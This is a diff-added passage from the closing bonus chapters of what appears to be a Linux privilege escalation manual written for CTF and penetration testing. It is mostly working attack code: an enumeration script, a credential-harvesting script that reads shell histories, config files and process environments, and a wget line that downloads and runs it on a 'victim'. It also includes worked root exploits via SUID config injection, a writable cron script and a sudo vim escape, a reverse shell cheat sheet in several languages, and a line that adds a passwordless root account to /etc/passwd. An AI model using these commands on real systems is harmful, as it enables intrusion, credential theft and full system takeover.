+banner "SUDO (most important!)"
+sudo -l 2>/dev/null && found "SUDO PERMISSIONS EXIST — CHECK ABOVE"
+sudo -n true 2>/dev/null && found "SUDO TOKEN CACHED — NO PASSWORD NEEDED"
+echo ""
+
+banner "SUID BINARIES"
+SUID=$(find / -perm -u=s -type f 2>/dev/null)
+echo "$SUID"
+# Highlight non-standard SUID
+echo "$SUID" | grep -vE "^/usr/bin/|^/bin/|^/usr/sbin/|^/sbin/" | while read f; do
+    found "NON-STANDARD SUID: $f"
+done
+echo ""
+
+banner "CAPABILITIES"
+CAPS=$(getcap -r / 2>/dev/null)
+echo "$CAPS"
+echo "$CAPS" | grep -vE "^$" | while read c; do found "CAPABILITY: $c"; done
+echo ""
+
+banner "CRON JOBS"
+cat /etc/crontab 2>/dev/null
+ls -la /etc/cron.d/ 2>/dev/null
+crontab -l 2>/dev/null
+echo ""
+
+banner "INTERESTING WRITABLE FILES"
+find /etc -writable -type f 2>/dev/null | while read f; do found "WRITABLE: $f"; done
+find / -perm -o+w -type f 2>/dev/null | grep -vE "/proc|/sys|/dev|/tmp|/run" | head -20
+echo ""
+
+banner "ENVIRONMENT"
+env | grep -iE "pass|secret|key|token|api" | while read e; do found "ENV: $e"; done
+echo $PATH | tr ':' '\n' | while read p; do
+    ls -lad "$p" 2>/dev/null | grep -E "^d.{5}w|^d..w" && found "WRITABLE IN PATH: $p"
+done
+echo ""
+
+banner "CREDENTIAL FILES"
+for f in ~/.bash_history ~/.zsh_history ~/.mysql_history ~/.psql_history; do
+    [ -r "$f" ] && echo "=== $f ===" && cat "$f" | grep -iE "pass|mysql|ssh|su " | head -10
+done
+find / -name ".env" -readable -type f 2>/dev/null | head -5 | while read f; do
+    found "ENV FILE: $f"
+    cat "$f" | grep -iE "pass|secret|key" | head -5
+done
+echo ""
+
+banner "NETWORK (INTERNAL SERVICES)"
+ss -tulpn 2>/dev/null | grep "127.0.0.1" | while read s; do found "LOCAL SERVICE: $s"; done
+echo ""
+
+banner "NFS"
+[ -r /etc/exports ] && cat /etc/exports && found "NFS EXPORTS FOUND — CHECK no_root_squash"
+showmount -e localhost 2>/dev/null
+echo ""
+
+banner "CONTAINERS"
+[ -f /.dockerenv ] && found "INSIDE DOCKER CONTAINER"
+id | grep -q "docker" && found "IN DOCKER GROUP"
+id | grep -q "lxd" && found "IN LXD GROUP — CONTAINER ESCAPE POSSIBLE"
+cat /proc/self/status | grep CapEff | grep -v "0000000000000000" | grep -q "3fff" && found "PRIVILEGED CONTAINER"
+echo ""
+
+banner "KERNEL"
+uname -r
+info "Search: 'linux kernel $(uname -r) exploit' or run linux-exploit-suggester"
+echo ""
+
+banner "INTERESTING FILES"
+find /home /root /opt /var/www -name "*.txt" -readable 2>/dev/null | head -10
+find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ed25519" 2>/dev/null | while read k; do
+    found "SSH KEY: $k"
+done
+find / -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null | grep -vE "/proc|/sys" | head -10
+
+echo -e "\n${GREEN}[*] Enumeration complete. Review [!] findings above first.${NC}"
+```
+
+```bash
+# Save it and use it:
+chmod +x myenum.sh
+# Transfer and run on victim:
+# python3 -m http.server 8000
+# wget http://LHOST:8000/myenum.sh -O /tmp/me.sh && chmod +x /tmp/me.sh && /tmp/me.sh
+```
+
+## D.3 Automated Credential Extractor
+
+```bash
+#!/bin/bash
+# credgrep.sh — hunt credentials everywhere
+
+echo "[*] Searching history files..."
+for f in /home/*/.bash_history /home/*/.zsh_history /root/.bash_history; do
+    [ -r "$f" ] || continue
+    echo "=== $f ==="
+    grep -iE "pass|mysql|ssh|ftp|secret|key" "$f" 2>/dev/null | head -20
+done
+
+echo "[*] Searching config files..."
+find / -readable -type f \( -name "*.conf" -o -name "*.config" -o -name "*.cfg" -o -name ".env" -o -name "*.ini" -o -name "*.xml" -o -name "*.yml" -o -name "*.yaml" \) 2>/dev/null | \
+    grep -vE "/proc|/sys" | head -50 | while read f; do
+    result=$(grep -iE "(password|passwd|secret|api_key|token|db_pass)\s*[=:]" "$f" 2>/dev/null | grep -v "#")
+    [ -n "$result" ] && echo "=== $f ===" && echo "$result" | head -5
+done
+
+echo "[*] Searching web files..."
+find /var/www /srv /opt -readable -type f -name "*.php" 2>/dev/null | head -30 | while read f; do
+    result=$(grep -iE "(password|passwd|db_pass)\s*=\s*['\"]" "$f" 2>/dev/null)
+    [ -n "$result" ] && echo "=== $f ===" && echo "$result" | head -3
+done
+
+echo "[*] Checking process environments..."
+for pid in $(ls /proc | grep -E "^[0-9]+$"); do
+    cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | \
+        grep -iE "pass|secret|token|key" | while read e; do
+        echo "[PID $pid] $e"
+    done
+done
+```
+
+---
+
+# Bonus E — The Unknown Binary Approach
+
+## E.1 How to Approach Any Unknown SUID/Sudo Binary
+
+When you find a custom binary with SUID set or allowed via sudo that isn't in GTFOBins, here is the **complete analytical methodology**:
+
+```
+STEP 1: RECONNAISSANCE ON THE BINARY
+────────────────────────────────────
+file /path/to/binary         # ELF type? 32 or 64-bit? Stripped?
+strings /path/to/binary | less  # Embedded strings — passwords? paths? commands?
+strings /path/to/binary | grep -E "^[a-z_]{3,}$"  # Short words = likely function/command names
+ls -la /path/to/binary       # Owner? Permissions? When modified?
+md5sum /path/to/binary       # Calculate hash to search online
+
+STEP 2: DYNAMIC ANALYSIS — WHAT DOES IT DO?
+─────────────────────────────────────────────
+ltrace /path/to/binary 2>&1         # What library functions does it call?
+strace /path/to/binary 2>&1         # What system calls does it make?
+strace -e execve /path/to/binary 2>&1   # Does it exec another program?
+strace -e open,openat /path/to/binary 2>&1  # What files does it open?
+
+STEP 3: WHAT DOES IT CALL WITHOUT FULL PATH?
+─────────────────────────────────────────────
+# From strings output: look for command names without /
+strings /path/to/binary | grep -v "/" | grep -E "^[a-z]" | sort -u
+# From strace:
+strace -e execve /path/to/binary 2>&1 | grep -v "^execve.*null"
+
+STEP 4: CAN I CONTROL ITS INPUT?
+──────────────────────────────────
+# Test command injection via arguments:
+/path/to/binary "test; id"
+/path/to/binary "$(id)"
+/path/to/binary "; id #"
+/path/to/binary "' OR '1'='1"    # If it queries a DB
+
+# Test via environment:
+VAR="test; id" /path/to/binary
+PATH=/tmp:$PATH /path/to/binary
+
+# Test via files:
+echo "; id #" > /tmp/input.txt
+/path/to/binary /tmp/input.txt
+
+STEP 5: DOES IT READ A WRITABLE CONFIG?
+─────────────────────────────────────────
+strace /path/to/binary 2>&1 | grep -E "open|openat" | grep -v "ENOENT" | grep -v "^open.*\"/"
+# Look for config files in writable locations
+
+STEP 6: BUFFER OVERFLOW POSSIBILITY?
+──────────────────────────────────────
+checksec --file=/path/to/binary    # Check protections
+python3 -c 'print("A"*1000)' | /path/to/binary  # Does it crash?
+# If no stack canary + no NX: classic overflow is possible
+```
+
+### E.2 Real Example Walkthrough
+
+```bash
+# You find: /usr/local/bin/admin_tool (owned by root, SUID set)
+# It's not in GTFOBins. What do you do?
+
+# Step 1: strings
+strings /usr/local/bin/admin_tool | head -40
+# Output includes:
+# /usr/bin/service    ← calls service (but with full path? or not?)
+# restart             ← argument?
+# service %s restart  ← SPRINTF FORMAT! calls service $ARG — COMMAND INJECTION!
+# Config: /etc/admin.conf  ← reads a config file
+
+# Step 2: Check if /etc/admin.conf is writable
+ls -la /etc/admin.conf
+# -rw-rw-r-- 1 root staff /etc/admin.conf ← staff group writable!
+id | grep staff    # You're in staff group!
+
+# Step 3: Check what's in admin.conf
+cat /etc/admin.conf
+# service_name=nginx
+
+# Step 4: The format string shows: service %s restart
+# If we control service_name, we control the argument to system()
+# Inject a command:
+echo "service_name=nginx; bash -p #" > /etc/admin.conf
+
+# Step 5: Run the SUID binary
+/usr/local/bin/admin_tool
+# It reads admin.conf → service_name = "nginx; bash -p #"
+# Executes: /usr/bin/service nginx; bash -p # restart
+# bash -p runs with EUID=root → ROOT SHELL!
+```
+
+---
+
+# Bonus F — Real CTF Case Studies
+
+## F.1 Case Study: Finding the Vector When Everything Looks Clean
+
+**Scenario:** You land on a machine as `www-data`. sudo -l shows nothing. No interesting SUID. No writable cron scripts. linpeas found nothing critical. You've been stuck for 30 minutes. What do you actually do?
+
+```
+THE METHODICAL UNSTICK PROCESS:
+
+1. Check EVERY user that has a shell
+   cat /etc/passwd | grep -vE "nologin|false|sync|halt|shutdown"
+   → Found: alice, bob, mysql — three real users
+
+2. Check what each user's home contains (readable files)
+   ls -la /home/alice/ /home/bob/
+   → /home/alice/.bash_history is readable (permissions mistake!)
+   cat /home/alice/.bash_history
+   → "mysql -u alice -p supersecret123"
+   → Found credential: alice:supersecret123
+
+3. Try credential everywhere
+   su alice          → Works! Password: supersecret123
+   sudo -l           → (root) NOPASSWD: /usr/bin/python3 !
+   sudo python3 -c 'import os; os.system("/bin/bash")'
+   → ROOT!
+
+LESSON: The vector was not a technical exploit.
+        It was a misread file permission on .bash_history.
+        The unstick process is to read every user's data carefully.
+```
+
+## F.2 Case Study: The Invisible Cron Job
+
+**Scenario:** You suspect a cron job but `/etc/crontab` is empty and `crontab -l` shows nothing.
+
+```
+CHECKING ALL CRON LOCATIONS:
+cat /etc/crontab                    # Empty
+crontab -l                          # No crontab for www-data
+ls /etc/cron.d/                     # Nothing
+ls /etc/cron.daily/                 # Some standard scripts
+
+But wait — run pspy:
+./pspy64 -i 100
+
+After 2 minutes of watching:
+2024/01/01 12:01:01 CMD: UID=0   PID=12345  | /bin/bash /opt/.hidden/cleanup.sh
+
+Found it! A script in /opt/.hidden/ running as root every minute.
+ls -la /opt/.hidden/cleanup.sh
+# -rwxrwxrwx 1 root root ... cleanup.sh ← WORLD WRITABLE!
+
+echo 'cp /bin/bash /tmp/b && chmod +s /tmp/b' >> /opt/.hidden/cleanup.sh
+# Wait 1 minute...
+/tmp/b -p    → ROOT!
+
+LESSON: Not all cron jobs are in /etc/crontab.
+        They can be anywhere — /opt/, /var/, /home/.
+        pspy finds them all regardless of location.
+```
+
+## F.3 Case Study: The Rabbit Hole Trap
+
+**Scenario:** You spend 2 hours on a complex path that goes nowhere.
+
+```
+What happened:
+  Found an SUID binary with an old CVE from 2015.
+  Spent 2 hours trying to get the exploit working.
+  The exploit only works on 32-bit systems and target is 64-bit.
+  The binary was patched anyway.
+
+What you should have done instead:
+  Set a 20-minute timer per exploitation attempt.
+  After 20 minutes of no progress on the CVE:
+    → Move to next finding
+    → Run pspy (hadn't done this yet)
+    → Check /home directories more carefully
+    → There was a writable cron script that took 2 minutes to exploit
+
+The rule: No single exploitation attempt should take more than 20-30 minutes.
+If it's not working after 20 minutes, it's either:
+  a) Not the intended path
+  b) You're missing something fundamental
+  c) Needs a different approach
+
+Pivot. Come back later with fresh eyes.
+```
+
+## F.4 Case Study: Chaining Three Small Weaknesses
+
+**Scenario:** No single big vulnerability exists. But three small issues combine into root.
+
+```
+Finding 1: bob's password is in his bash history (MySQL command)
+Finding 2: bob can run /usr/bin/vim /var/log/app.log as root (sudo)
+Finding 3: /var/log/app.log doesn't exist yet (creates it fresh each time)
+
+Individually:
+  Finding 1 alone: just bob's MySQL password
+  Finding 2 alone: can only edit one specific log file (seems harmless)
+  Finding 3 alone: irrelevant
+
+Chained:
+  su bob (using found password)
+  sudo /usr/bin/vim /var/log/app.log
+  → vim opens as root creating a new file
+  → :!/bin/bash  (vim shell escape — runs as root!)
+  → ROOT
+
+LESSON: Most real machines require chaining.
+        When you can't find a single big exploit,
+        map EVERY capability and EVERY finding onto paper.
+        Then look for chains.
+
+CHAIN MAP TEMPLATE:
+┌─────────────────────────────────────────┐
+│ What I have:                            │
+│   → www-data shell                      │
+│   → Can read /home/bob/.bash_history    │
+│   → Bob's MySQL password                │
+│                                         │
+│ What I can get:                         │
+│   → su bob (using password)             │
+│   → bob's sudo rights                   │
+│                                         │
+│ What bob can do:                        │
+│   → sudo vim /var/log/app.log           │
+│   → vim shell escape                    │
+│   → ROOT                                │
+└─────────────────────────────────────────┘
+```
+
+## F.5 The "Why Isn't This Working?" Checklist
+
+When an exploit that should work isn't working:
+
+```
+COMMON REASONS EXPLOITS FAIL:
+
+[ ] Wrong architecture? (32-bit exploit on 64-bit binary)
+    file /path/to/binary | grep "32\|64"
+
+[ ] Wrong OS/kernel version?
+    uname -a && cat /etc/os-release
+
+[ ] Binary is patched?
+    md5sum binary; compare to known vulnerable hash
+
+[ ] Missing dependency?
+    ldd exploit_binary 2>&1 | grep "not found"
+
+[ ] Permissions wrong?
+    ls -la /tmp/exploit  # Must be executable
+
+[ ] /tmp is mounted noexec?
+    mount | grep /tmp | grep noexec
+    # If so: use /dev/shm or /var/tmp instead
+
+[ ] Wrong working directory?
+    Some exploits need to run from a specific directory
+    cd /tmp && ./exploit
+
+[ ] ASLR enabled?
+    cat /proc/sys/kernel/randomize_va_space
+    # 0=off, 1=conservative, 2=full
+
+[ ] Stack canaries?
+    checksec --file=./binary
+
+[ ] SELinux/AppArmor blocking?
+    getenforce 2>/dev/null  # SELinux status
+    aa-status 2>/dev/null   # AppArmor status
+
+[ ] Compile error in exploit source?
+    gcc -m32 exploit.c -o exploit  # 32-bit compile
+    gcc exploit.c -o exploit -lpthread  # With pthreads
+    gcc exploit.c -o exploit -static   # Static linking
+
+[ ] Network connectivity issue?
+    # For reverse shell — can target reach you?
+    # Test: bash -c 'echo test > /dev/tcp/LHOST/LPORT'
+    # Listen: nc -lvnp LPORT
+
+[ ] Python2 vs Python3 mismatch?
+    python --version; python3 --version
+    # Specify: python2 exploit.py or python3 exploit.py
+```
+
+---
+
+# Bonus G — Advanced Enumeration: Things linpeas Misses
+
+## G.1 Manual Checks That Automated Tools Skip
+
+```bash
+# ===== RECENTLY INSTALLED PACKAGES =====
+# Something installed recently might have weak permissions or known CVEs
+cat /var/log/dpkg.log | grep "install " | tail -20   # Debian/Ubuntu
+rpm -qa --last | head -20                              # Red Hat/CentOS
+
+# ===== RUNNING SERVICES WITH OPEN FILES =====
+# Find which process is using each port — sometimes reveals more than ss
+lsof -i -P -n 2>/dev/null | grep LISTEN
+
+# ===== MAIL =====
+# Users often have credentials in their mail
+cat /var/mail/www-data 2>/dev/null
+cat /var/mail/root 2>/dev/null
+ls /var/mail/ 2>/dev/null
+ls /var/spool/mail/ 2>/dev/null
+
+# ===== INSTALLED SOFTWARE IN NON-STANDARD PATHS =====
+find /usr/local /opt /srv /app /data -type f -executable 2>/dev/null | head -30
+ls -la /usr/local/bin/ /usr/local/sbin/
+
+# ===== WORLD-READABLE PRIVATE KEYS =====
+find / -name "*.pem" -o -name "*.key" -o -name "*.p12" 2>/dev/null | while read f; do
+    perm=$(stat -c "%a" "$f" 2>/dev/null)
+    echo "$perm $f"
+done | grep -v "^[46][04][04]"  # Show keys that are TOO readable
+
+# ===== SYSTEMD UNIT FILE ENVIRONMENT VARS =====
+# Services often have credentials in their unit files
+grep -r "Environment\|EnvironmentFile" /etc/systemd/ /lib/systemd/ 2>/dev/null | \
+    grep -iE "pass|secret|key|token"
+
+# ===== ANSIBLE FACTS AND VAULT FILES =====
+find / -name "*.vault" -o -name ".vault_pass" -o -name "vault_password_file" 2>/dev/null
+find /etc/ansible /opt/ansible /home -name "*.yml" 2>/dev/null | \
+    xargs grep -l "ansible_become_pass\|ansible_password" 2>/dev/null
+
+# ===== PYTHON EGG-LINK FILES =====
+# Editable Python installs — may be writable and importable
+find / -name "*.egg-link" 2>/dev/null | xargs cat 2>/dev/null
+
+# ===== READABLE SHADOW BACKUP =====
+ls -la /etc/shadow- /etc/passwd- 2>/dev/null    # Backup files — sometimes more permissive
+
+# ===== TIMERS (MODERN CRON EQUIVALENT) =====
+systemctl list-timers --all 2>/dev/null
+find /etc/systemd /lib/systemd -name "*.timer" 2>/dev/null | xargs cat 2>/dev/null
+
+# ===== DBUS SERVICES =====
+# Some D-Bus services accept root commands from unprivileged users
+busctl list 2>/dev/null | grep -v "^NAME\|dbus\|systemd\|org.free"
+
+# ===== CAPABILITIES ON RUNNING PROCESSES =====
+# Even if no files have caps, running processes might:
+cat /proc/*/status 2>/dev/null | grep -A1 "^Name:\|^CapEff:" | \
+    grep -B1 "CapEff:.*[^0]00$" | grep "^Name:"
+
+# ===== KERNEL MODULES =====
+# Loaded kernel modules — any custom/suspicious ones?
+lsmod | grep -v "^Module"
+# Can you load modules?
+ls -la /sbin/insmod /sbin/modprobe
+# Check for writable module paths:
+find /lib/modules/$(uname -r) -writable 2>/dev/null
+
+# ===== WRITABLE /proc ENTRIES =====
+# Some kernel tunables can be abused
+ls -la /proc/sys/kernel/core_pattern   # If writable — kernel exploit primitive
+cat /proc/sys/kernel/core_pattern      # Where core dumps go
+# If: |/path/to/script — and script is writable → crash a SUID → code exec as root
+
+# ===== CONTAINER ESCAPE CHECKS =====
+# More thorough than just /.dockerenv
+cat /proc/1/cgroup 2>/dev/null | grep -q "docker\|lxc\|kubepods" && echo "IN CONTAINER"
+ls /sys/fs/cgroup/memory/docker 2>/dev/null && echo "Docker cgroup found"
+cat /proc/mounts | grep -E "overlay|aufs" && echo "Likely container filesystem"
+```
+
+## G.2 The Anti-Stuck Framework
+
+When you are completely stuck and have done everything:
+
+```
+LEVEL 1 — RECHECK (0-10 min):
+  Re-read your nmap output word by word
+  Re-read your gobuster output — any 403s you didn't check?
+  403 = exists but forbidden — sometimes has exploitable content
+  curl -v http://TARGET/forbidden_path/ -X OPTIONS
+  curl -v http://TARGET/forbidden_path/ -X TRACE
+
+LEVEL 2 — EXPAND SCOPE (10-20 min):
+  Are there vhosts? Try: curl -H "Host: admin.TARGET.htb" TARGET
+  Are there other ports? Try: nmap -p- again with slower settings
+  UDP scan: sudo nmap -sU --top-ports 50 TARGET
+  Did gobuster finish? What status codes are at 301?
+  Try extensions you haven't tried: .asp .aspx .txt .xml .json .config
+
+LEVEL 3 — REFRAME (20-30 min):
+  What if the web vulnerability is not in the obvious place?
+  Check every page source for: comments, hidden forms, version numbers
+  Check every JS file: grep for endpoints, API keys, paths
+  Try: curl http://TARGET/api/ http://TARGET/v1/ http://TARGET/rest/
+  Try SQLi on EVERY parameter you've seen — not just login forms
+
+LEVEL 4 — BRUTE (30-40 min):
+  Username enumeration: smtp-user-enum, ssh timing, web response diff
+  Password brute if you have a username: hydra with rockyou
+  Directory brute with bigger wordlist:
+    gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-big.txt
+
+LEVEL 5 — GET FRESH EYES (take a break):
+  Stop. Make tea/coffee. Come back in 15 minutes.
+  You will notice something you missed.
+  The brain needs to reset.
+  Most people find their solution within 5 minutes of returning.
+```
+
+---
+
+# 🔖 QUICK REFERENCE BOOKMARKS
+
+> Copy these anchor links to jump to sections you use most often.
+
+```
+FASTEST PRIVESC CHECKS (first 60 seconds on any box):
+  sudo -l                          → Chapter 15
+  find / -perm -4000 2>/dev/null   → Chapter 11
+  getcap -r / 2>/dev/null          → Chapter 12
+  cat /etc/crontab                 → Chapter 13
+
+MOST COMMON INITIAL ACCESS:
+  LFI → log poisoning              → Chapter 0b.3.2
+  File upload bypass               → Chapter 0b.3.5
+  Default credentials              → Chapter 0d.1
+  SQLi authentication bypass       → Chapter 0b.3.1
+
+REVERSE SHELL CHEATSHEET:
+  Bash:   bash -i >& /dev/tcp/IP/PORT 0>&1
+  Python: python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+  nc:     rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT>/tmp/f
+  php:    php -r '$s=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+SHELL STABILIZE:
+  python3 -c 'import pty;pty.spawn("/bin/bash")'
+  Ctrl+Z → stty raw -echo → fg → reset → export TERM=xterm-256color
+
+WRITE ROOT USER (/etc/passwd writable):
+  echo 'x::0:0::/root:/bin/bash' >> /etc/passwd && su x
+
+STUCK? DECISION TREE: Chapter 36.1
+FULL CHECKLIST:        Chapter 34
+COMMAND CARD:          Chapter 35
+MACHINE METHODOLOGY:   Chapter 39
+THM FREE ROOMS:        Chapter 40
+HTB FREE MACHINES:     Chapter 41
+VULNHUB VMS:           Chapter 42
+```
+
+---
+
 *This manual is intended for ethical hacking, CTF competitions, and authorized penetration testing only.*
 *Always obtain explicit written permission before testing any system you do not own.*
 *Understanding offensive techniques makes better defenders.*
 
 ---
+
+```
+ ██████╗  ██████╗  ██████╗ ████████╗    ██████╗  ██████╗  ██████╗ ████████╗
+ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝    ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
+ ██████╔╝██║   ██║██║   ██║   ██║       ██████╔╝██║   ██║██║   ██║   ██║
+ ██╔══██╗██║   ██║██║   ██║   ██║       ██╔══██╗██║   ██║██║   ██║   ██║
+ ██║  ██║╚██████╔╝╚██████╔╝   ██║       ██║  ██║╚██████╔╝╚██████╔╝   ██║
+ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝       ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝
+
+  Linux Privilege Escalation: The Complete Field Manual
+  Zero to Root | Zero to Foothold | Every Technique | Every Machine
+  Chapters 0–43 + Bonus A–G
+```
+
 *End of Linux Privilege Escalation: The Complete Field Manual*
